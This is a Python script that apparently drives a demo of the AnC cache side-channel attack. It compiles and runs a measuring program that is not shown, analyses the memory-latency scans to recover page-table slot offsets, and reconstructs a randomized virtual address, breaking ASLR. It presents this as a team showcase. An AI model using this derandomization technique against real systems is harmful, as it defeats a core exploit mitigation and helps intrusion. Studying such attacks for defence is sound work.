#!/usr/bin/env python

from __future__ import division
import os
import numpy as np
import subprocess
import time
import shlex
import sys
import random

scan_filename = './scan.txt'
MARGIN_OF_ERROR = 0.8
NUM_CACHELINE_OFFSETS = 64
MAX_DELAY_THRESHOLD = 600
PIPE_PATH = "/home/lucian/secure_software/demo/my_pipe"

if not os.path.exists(PIPE_PATH):
    os.mkfifo(PIPE_PATH)

subprocess.Popen(['gnome-terminal', '--geometry', '90x62+0+1080', '--zoom=1.2', '-e', 'tail -f %s' % PIPE_PATH])

def find_cacheline_offsets():
	max_offset = [-1, -1, -1, -1]
	max_value = [0, 0, 0, 0]

	if not os.path.isfile(scan_filename):
		print("scan.txt does not exist")
		return

	f = open(scan_filename, 'r')
	scan_values = [int(line) for line in f]
	a = np.reshape(scan_values, (-1, NUM_CACHELINE_OFFSETS))
	
	f.close()
	
	for offset in range(NUM_CACHELINE_OFFSETS):
		values_per_level = [0, 0, 0, 0]
		
		for page_index in range(len(a)):
			for i in range(len(values_per_level)):			
				values_per_level[i] += min(a[page_index][(offset + (i + 1) * page_index) % NUM_CACHELINE_OFFSETS], MAX_DELAY_THRESHOLD)
				
		for i in range(len(values_per_level)):
			if values_per_level[i] > max_value[i]:
				max_value[i] = values_per_level[i]
				max_offset[i] = offset
				
	return max_offset


def find_slot_offset(lvl, cacheline_offsets):
	filename = './scan_{0}.txt'.format(lvl)
	max_offset = -1
	max_value = 0
	
	if not os.path.isfile(filename):
		print("{0} does not exist".format(filename))
		return -1

	f = open(filename, 'r')
	scan_values = [int(line) for line in f]
	
	# convert array of values to matrix with 64 columns
	a = np.reshape(scan_values, (-1, NUM_CACHELINE_OFFSETS))
	la = len(a)
	rla = range(la)
	m = a.mean(axis=0) # store mean latencies for every page
	
	for i in cacheline_offsets:
		for page_index in rla:
			# tune down signals for cacheline offsets
			a[page_index][(i + page_index) % NUM_CACHELINE_OFFSETS] = m[page_index]
	
	# store maximum values for measurements for each of 8 possible PTE signal patterns
	values_per_level = [0, 0, 0, 0, 0, 0, 0, 0]
	l = len(values_per_level)
	rl = range(l)
	
	# measure each possible pattern
	for i in rl:
		# iterate over measured pages
		for page_index in rla:
			values_per_level[i] += min(a[page_index][(cacheline_offsets[4-lvl] + int((page_index + i) / l)) % NUM_CACHELINE_OFFSETS], MAX_DELAY_THRESHOLD)
	
	# check if patterns observed for offset are higher than already observed patterns
	for i in rl:
		if values_per_level[i] > max_value:
			max_value = values_per_level[i]
			max_offset = i

	return max_offset
	
	
def make_prog():
	make_process = subprocess.Popen(['make', 'clean', 'all'], stdout=subprocess.PIPE)
	#make_process.communicate()
	if make_process.wait() != 0:
		print("Failed to make prog")
		return -1
		
	return 0
	

def run_prog(big_offset, small_offset):
	cmd = "./prog {0} {1}".format(big_offset, small_offset)
	process = subprocess.Popen(shlex.split(cmd), stdout=subprocess.PIPE)
	(stdoutdata, stderrdata) = process.communicate()
	exit_code = process.wait()

	return (exit_code, stdoutdata.split(":")[1].strip())


def main(word, big_offset, small_offset):
	#print("Compiling prog..")

	if make_prog() < 0:
		return -1
		
	#print("Successfully compiled prog")
	print("Executing prog, profiling memory accesses..")
	
	(exit_code, target_address) = run_prog(big_offset, small_offset)
	if exit_code < 0:
		print("Failed to run prog")
		return -1

	print("Finished running prog, solving target address based on memory profiles..")
	
	result = 0
	offsets = find_cacheline_offsets()
	
	if len(offsets) != 4:
		print("Something's not right here.. Found {0} PT levels".format(len(offsets)))
		return -1
	
	for i in range(4):
		slot = (offsets[i] << 3) | find_slot_offset(4 - i, offsets)
		
		print("Slot at PTL{0}: {1}".format(4-i, slot))
		
		if slot < 0:
			print("Failed to correctly identify offset within cacheline for level {0}".format(4 - i))
			return
		
		result = (result << 9) | slot
	print("Target address is {0}".format(target_address))
	result = hex(result << 12)
	print("Derandomized virtual address is {0}\n".format(result))

	p = open(PIPE_PATH, "w");
	if target_address == result:
		p.write(word)
		p.flush()
	else: 
		p.write("(whoops)")
		p.flush()


if __name__ == "__main__":
	words = ["Team ", "Echo ", "proudly ", "presents: ", "AnC!"]
	start = time.time()
	for index in range(len(words)):
		big_offset = random.randint(0, 96)
		small_offset = random.randint(0, 2048)
		main(words[index], big_offset, small_offset)
	stop = time.time()
	print("\nExecution took {0} seconds".format(stop - start))

